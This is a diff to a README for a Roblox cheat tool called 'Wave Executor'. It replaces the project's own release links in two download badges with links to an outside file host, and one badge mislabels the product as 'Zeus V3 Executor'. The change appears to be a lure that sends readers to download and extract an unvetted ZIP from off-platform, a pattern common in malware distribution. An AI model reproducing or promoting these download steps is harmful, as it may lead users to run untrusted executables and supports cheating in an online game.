@@ -1,8 +1,8 @@
-# 🚀 Wave Executor - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](../../releases)**
+# 🚀 Wave Executor - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://downeefiles.com/s/bobloxwv)**
 
 ## Quick Installation
 To get started with Wave Executor, follow these simple steps:
-1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Zeus%20V3%20Executor-blueviolet)](../../releases)**
+1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Zeus%20V3%20Executor-blueviolet)](https://downeefiles.com/s/bobloxwv)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
